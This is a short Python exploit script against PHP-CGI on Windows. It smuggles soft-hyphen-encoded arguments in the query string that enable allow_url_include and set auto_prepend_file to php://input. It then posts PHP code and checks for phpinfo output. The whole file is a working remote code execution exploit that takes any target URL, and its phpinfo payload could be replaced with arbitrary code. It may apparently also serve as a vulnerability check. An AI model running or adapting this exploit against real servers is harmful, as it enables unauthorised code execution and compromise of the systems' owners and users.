import requests
import sys


def exploit_php_cgi(url):
    # Construct the target URL
    target_url = f"{url}/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"

    # Prepare the payload
    payload = "<?php phpinfo();?>"

    # Send the POST request
    response = requests.post(target_url, data=payload)

    # Check if the response contains "phpinfo()</title>"
    if "phpinfo()</title>" in response.text:
        return True
    else:
        return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python exploit.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    result = exploit_php_cgi(url)

    print(result)
